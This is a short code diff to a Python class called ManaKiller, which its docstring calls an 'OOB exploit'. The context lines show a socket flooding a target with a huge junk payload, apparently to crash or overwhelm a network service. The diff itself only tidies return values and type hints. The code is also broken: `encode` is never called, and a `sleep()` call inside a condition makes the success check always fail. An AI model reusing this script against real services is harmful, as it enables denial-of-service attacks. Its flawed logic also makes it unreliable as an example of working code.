@@ -51,11 +51,12 @@ class ManaKiller:
                     # NOTE: Send payload.
                     sock.send('lmaoWTF'.join('ManaKiller'*999999).encode)
                     
-                return True
             except:
-                return
+                return False
             
-    def execute(self: object) -> bool | None:
+            return True
+            
+    def execute(self: object) -> bool:
         """Execute OOB exploit.
         
             Return: bool
@@ -65,3 +66,5 @@ class ManaKiller:
             # NOTE: Execute exploit.
             if self.exploit(attack = True) and sleep(2) and not self.exploit():
                 return True
+                
+            return False
